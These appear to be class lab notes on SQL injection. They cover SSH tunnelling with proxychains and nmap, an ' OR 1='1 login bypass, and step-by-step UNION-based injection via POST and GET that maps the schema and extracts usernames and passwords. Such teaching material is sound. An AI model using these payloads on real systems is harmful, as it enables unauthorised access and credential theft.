# SQL

SQL - Structured Query Language

- What type of SQL is  MARIA DB, will work with cmds SELECT/UNION/FORWARD

(Below is practice link)

https://sqlbolt.com/


# SQL Demo

- Given (ip)

**ping -c (ip)** (from jump)

- Set up Dynamic tunnel to port scan (from linops)

**ssh -S /tmp/demo demo -O forward -D 9050**

**ss -antlp | grep 9050** (to listen)

**proxychains nmap (ip)**

- ( will get ports open on ip, then create a local forward to the ip and its port)

  **ssh -S /tmp/demo demo -O forward -L rhp:(ip):port**

- ( go to firefox and go to website)

**127.0.0.1:rhp**

- (http enumeration)

  /robots.txt (off of webpage)

  **proxychains nmap --script=http-enum (ip) -p #**

# Authentication Bypass
 ### Demo part YOU NEED TO KNOW

**user: 'OR 1='1**

**pass: 'OR 1='1**

 - (for password on webpage)
 - you can right-click inspect and remove password from **type="password"** to see password you enter

 - (now you can login)

**GO to inspect > Network > Post > Request > Raw will give (radio button)** 

- (at the end of URL, type '? and content from raw button')

**x.x.x.x/login.php?(content from raw button)**

- (Success w/ bypass, now your given creds)

**right-click - view page source** ( to see better) 

# SQL Injection POST

1. Blind Injection (identify vulnerable field)

Ex: Audi 'OR 1='1 (#) --> sometimes need #

2. Identify Number of Columns

(build off of inject above and place numbers in the spot from the paramenters it gave you)

ex: what it gave - Title Manufacturer	Cost	Color	Year
 
ex: Audi 'UNION SELECT 1,2,3,4,5' #

- (then will give you)

Manufacturer	   Cost	   Color	    Year

Audi 	           22000    	red 	     2134

1     	             3 	    4          	5


(note: your running 2 queries: 1 = Audi and 2 = UNION w/ #'s to align the paramenters with the numbers to be in order)

3. Golden Statement

syntax: **UNION SELECT column_name,column_name FROM database.table**

**Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #**

(note: that table_schema is database)

- (duplicate page- so you can do wtv w/o ruining the original)

4. Craft Queries

use same syntax : **UNION SELECT column_name,column_name FROM database.table**

- (look for passwords)

  **Audi' UNION SELECT 1,2,username,passwd,jump FROM session.userinfo; #**

- (can put an @@version in place of one of the numbers to see version)

  **Audi' UNION SELECT @@version,2,username,passwd,jump FROM session.userinfo; #**


# SQL Injection GET
### Building off of URL

1. Blind Injection (Identify Vulnerable Field)

**http://127.0.0.1:10004/uniondemo.php?Selection=1 OR 1=1**

- (you will just change the # after Selection=# to see what is vulnerable)

2. Identify Number of Columns

**http://127.0.0.1:10004/uniondemo.php?Selection=2 UNION SELECT 1,2,3**

- (Reorder numbers to match ouput of query that it prompts)

**http://127.0.0.1:10004/uniondemo.php?Selection=2 UNION SELECT 1,3,2**


3. Golden Statement

**http://127.0.0.1:10004/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns**

(note: this dumps out entire database) 

4. Craft Queries

**http://127.0.0.1:10004/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns**


